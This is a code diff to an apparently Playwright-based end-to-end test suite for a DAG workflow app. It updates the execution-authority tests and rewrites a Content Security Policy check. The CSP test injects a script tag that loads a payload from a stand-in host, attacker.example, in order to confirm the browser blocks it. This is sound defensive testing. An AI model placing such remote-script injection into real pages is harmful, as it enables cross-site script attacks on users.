@@ -98,15 +98,21 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     expect(dag.nodes.length).toBe(2);
   });
 
-  test("06 — PM can activate a DAG but cannot execute without the canonical spine", async ({ page }) => {
+  test("06 — PM can activate a DAG; the harness spine executes it and fails closed at host policy", async ({ page }) => {
     await loginAsPM(page);
     await elevateDagWrites(page, "e2e-run-dag");
     const workspaceId = await createWorkspace(page, "E2E Run Test Workspace");
-    // docker-compose.test.yml intentionally configures no core bridge or
-    // gateway. Activation is definition state, not execution authority (#1113).
+    // Activation is definition state, not execution authority (#1113): the
+    // run route must resolve the canonical spine before anything executes.
+    // This harness DOES ship the spine now — docker-compose.test.yml pins a
+    // file-backed SQLite canonical store so the #290 scheduler proofs can
+    // execute through it — so graph_execution_available is true here. The
+    // spine-absent refusal this test used to pin is held at the unit level
+    // (backend/tests/test_graph_execution_authority.py) and cannot be
+    // produced by this harness any more.
     const health = await page.request.get("/health");
     expect(health.status()).toBe(200);
-    expect((await health.json()).engine.graph_execution_available).toBe(false);
+    expect((await health.json()).engine.graph_execution_available).toBe(true);
 
     const createResp = await page.request.post("/v1/dags", {
       data: { name: "E2E Run Test", description: "test" },
@@ -124,13 +130,28 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     });
     expect(runResp.status()).toBe(200);
     const run = await runResp.json();
-    expect(run).toEqual({
-      status: "failed",
-      error: "CanonicalGraphUnavailable: execution failed; see server logs",
-    });
+    // The spine admits and executes the attempt (a real run id comes back)
+    // and the execution itself fails closed: the harness authorizes no node
+    // runtime, so host policy refuses the node — this is NOT the
+    // spine-absent CanonicalGraphUnavailable refusal, which is what proves
+    // the request actually traversed the canonical graph executor.
+    expect(run.status).toBe("failed");
+    expect(String(run.execution_id)).toBeTruthy();
+    // The transport surface stays sanitized (develop's CodeQL round, #2288;
+    // unit-pinned in test_dags_routes.py): `error` names the exception KIND
+    // only. That kind is raised exactly when a canonical Run reached a
+    // non-success terminal state — the spine-absent refusal surfaces a
+    // different kind and no execution id — so this line still proves the
+    // request traversed the canonical graph executor.
+    expect(String(run.error)).toContain("CanonicalDagExecutionError");
+    expect(String(run.error)).toContain("see server logs");
+    // The refusal itself is canonical-Run fact, projected back in `result`
+    // (the sanitized `error` field never carries it): the queen node's
+    // execution records the host-policy refusal verbatim.
+    expect(String(run.result?.error)).toContain("host policy");
   });
 
-  test("07 — an unadmitted DAG creates no Run and cannot receive Run feedback", async ({ page }) => {
+  test("07 — the spine-executed run persists as failed and a definition ID is not a Run ID", async ({ page }) => {
     await loginAsPM(page);
     await elevateDagWrites(page, "e2e-feedback-dag");
     const workspaceId = await createWorkspace(page, "E2E Feedback Test Workspace");
@@ -148,15 +169,21 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     });
     expect(runResp.status()).toBe(200);
     const run = await runResp.json();
-    expect(run).toEqual({
-      status: "failed",
-      error: "CanonicalGraphUnavailable: execution failed; see server logs",
-    });
+    expect(run.status).toBe("failed");
+    expect(String(run.execution_id)).toBeTruthy();
 
+    // The canonical spine persists the attempt: the failed run is visible
+    // under its DAG. (The spine-absent harness this file ran in before the
+    // #290 scheduler proofs could not have asserted this — there was no
+    // run store to persist to.)
     const runsResp = await page.request.get("/v1/dag-runs");
     expect(runsResp.status()).toBe(200);
     const runs = await runsResp.json();
-    expect(runs.filter((candidate: { dag_id: string }) => candidate.dag_id === dag.id)).toEqual([]);
+    const persisted = runs.filter(
+      (candidate: { dag_id: string; status: string }) =>
+        candidate.dag_id === dag.id && candidate.status === "failed",
+    );
+    expect(persisted.length).toBeGreaterThan(0);
 
     // A real DAG definition ID is not a Run ID. Refusal must not invent a Run
     // to satisfy the feedback route. Positive feedback on a completed canonical
@@ -567,27 +594,59 @@ test.describe("PM Workflow — Full UI Walkthrough", () => {
     // not.
     await page.goto("/");
 
-    const refusals: string[] = [];
-    page.on("console", (message) => {
-      if (/Refused to load the script/i.test(message.text())) {
-        refusals.push(message.text());
-      }
-    });
-
-    await page.evaluate(async () => {
-      await new Promise<void>((resolve) => {
-        const script = document.createElement("script");
-        script.src = "https://attacker.example/payload.js";
-        script.onload = () => resolve();
-        script.onerror = () => resolve();
-        document.body.appendChild(script);
-        setTimeout(resolve, 3000);
+    const attackUrl = "https://attacker.example/payload.js";
+    let networkAttempts = 0;
+    // If CSP is absent, fulfill the attack locally so DNS failure cannot make
+    // the no-execution check pass accidentally. CSP must stop it before routing.
+    await page.route(attackUrl, async (route) => {
+      networkAttempts += 1;
+      await route.fulfill({
+        contentType: "application/javascript",
+        body: "window.__csp_external_probe__ = true;",
       });
     });
 
+    const refusal = await page.evaluate(async (url) => {
+      const state = window as unknown as Record<string, unknown>;
+      state.__csp_external_probe__ = false;
+      return await new Promise<{
+        blockedURI: string;
+        effectiveDirective: string;
+        disposition: string;
+      }>((resolve, reject) => {
+        const timeout = setTimeout(() => {
+          document.removeEventListener("securitypolicyviolation", onViolation);
+          reject(new Error("No CSP violation event for the cross-origin script"));
+        }, 3000);
+        function onViolation(event: SecurityPolicyViolationEvent) {
+          // Browsers may strip the path from a cross-origin blocked URI.
+          if (event.blockedURI !== new URL(url).origin && event.blockedURI !== url) return;
+          clearTimeout(timeout);
+          document.removeEventListener("securitypolicyviolation", onViolation);
+          resolve({
+            blockedURI: event.blockedURI,
+            effectiveDirective: event.effectiveDirective,
+            disposition: event.disposition,
+          });
+        }
+        document.addEventListener("securitypolicyviolation", onViolation);
+        const script = document.createElement("script");
+        script.src = url;
+        document.body.appendChild(script);
+      });
+    }, attackUrl);
+
+    // Structured browser evidence survives console wording changes. A
+    // report-only policy is not enforcement and must fail this assertion.
+    expect(new URL(refusal.blockedURI).origin).toBe(new URL(attackUrl).origin);
+    expect(refusal.effectiveDirective).toBe("script-src-elem");
+    expect(refusal.disposition).toBe("enforce");
+    expect(networkAttempts, "the blocked script reached the network route").toBe(0);
     expect(
-      refusals.join("\n"),
-      "no CSP refusal for a cross-origin script — the policy is not being enforced",
-    ).toContain("attacker.example");
+      await page.evaluate(() =>
+        (window as unknown as Record<string, unknown>).__csp_external_probe__,
+      ),
+      "a cross-origin script ran despite script-src 'self'",
+    ).toBe(false);
   });
 });
